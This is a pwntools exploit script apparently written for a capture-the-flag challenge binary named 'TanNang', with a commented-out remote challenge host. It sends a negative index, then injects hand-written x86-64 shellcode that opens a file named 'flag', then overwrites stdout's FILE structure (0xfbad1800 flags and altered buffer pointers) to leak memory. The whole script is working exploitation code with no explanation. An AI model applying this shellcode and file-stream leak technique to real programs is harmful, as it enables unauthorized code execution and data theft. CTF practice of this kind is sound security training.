from pwn import *

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

p = process('./TanNang')
# p = remote('challenges.hazmat.buptmerak.cn', 20237)
# attachment = ELF('./')
# libc = ELF('./')
p.sendlineafter(b'like?', b'-32')

addr = 0x4040C0 + 17
shellcode = f'''
    xor  al, 2
    shr  ebx, 4
    xchg ebx, edx
    mov  edi, {addr}
    xor  esi, esi
    syscall
    ret
'''
p.sendafter(b'file!', asm(shellcode) + b'flag')

payload = p64(0xfbad1800) + p64(0) * 3 + p64(0x95270000) + p64(0x95270100)
p.sendlineafter(b'others!', payload)

p.interactive()